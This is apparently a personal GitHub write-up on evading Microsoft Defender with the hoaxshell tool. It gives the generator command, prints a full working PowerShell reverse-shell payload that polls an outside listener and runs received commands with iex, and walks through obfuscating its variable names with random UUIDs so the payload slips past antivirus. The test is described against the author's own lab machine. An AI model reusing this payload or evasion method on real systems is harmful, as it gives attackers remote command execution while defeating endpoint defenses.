# hoaxshell

Feb 23,

So I just want to share my writeup because I've been trying to bypass
defender for sometime now and this is the first time I Officially bypassed
Defender , I've spent countless hours obfuscating my powershell
command using unicorn, invoke-obfuscation and chimera , I would highly
suggest to watch t3l3machus it definitely helped me to bypass
defender, thank you brother

![2-1](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/2b438ba0-2e94-4c58-9e86-4a95ab128d5f)

# 1. Create a shell using Hoaxshell

I used this command,
```
./hoaxshell.py -s 192.168.50.46 -r -H 'Authorization'
```

-r = raw payload
-H = additional hoaxshell tag to bypass defender


# 2. and then it will spit out this shell here

```
$s='192.168.50.46:8080';$i='db6a3b05-dc656d46-1fb446ac';$p='
[http://';$v=Invoke-WebRequest](http://';$v=Invoke-WebRequest) -UseBasicParsing -Uri $p$s/db6a3b05 -
Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -
UseBasicParsing -Uri $p$s/dc656d46 -Headers
@{"Authorization"=$i}).Content;if ($c -ne 'None') {$r=iex $c -
ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;
$t=Invoke-WebRequest -Uri $p$s/1fb446ac -Method POST -Headers
@{"Authorization"=$i} -Body
([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

![2-2](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/3bde52e7-7870-4b65-9a04-b0f687e34683)


this raw payload would be flagged down by microsoft so I used variable
substitution I learned from t3l3machu

# 3.Using python I used uuid module as well to create random strings

python commands I used to spit out 10 random strings

import uuid
uuid.uuid4().hex
for i in range(10):
uuid.uuid4().hex


![2-3](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/0552328b-5e21-4b7b-b59f-d6d3b180066f)



# 4. and then I opened sublime text to edit some variables ,
I changed 7 variables from the raw payload before, to look like this,


![2-4](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/9789c167-9a55-4b5e-af13-92dc7a6dfd8b)


# 5. and then I tested it in my victim machine with Microsoft Defender
active , and it WORKS!!!


![2-5](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/4b857298-8967-4d0d-be16-d95955772431)


I waited for 15mins to check if I would be disconnected.... I noticed that I
am not getting disconnected even when I am executing commands like
ipconfig,sysinfo,whoami etc... , The only time I got disconnected was
when I created a file in the desktop folder

![2-6](https://github.com/sudo-awk/av_evasion-hoaxshell/assets/106952099/21268880-ba81-46e8-89ef-155e251011be)


However, I got disconnected a few minutes I created a text file inside a desktop folder..
I think thats it for hoaxshell for now and will try some other command and control shell 

# Thank you for reading
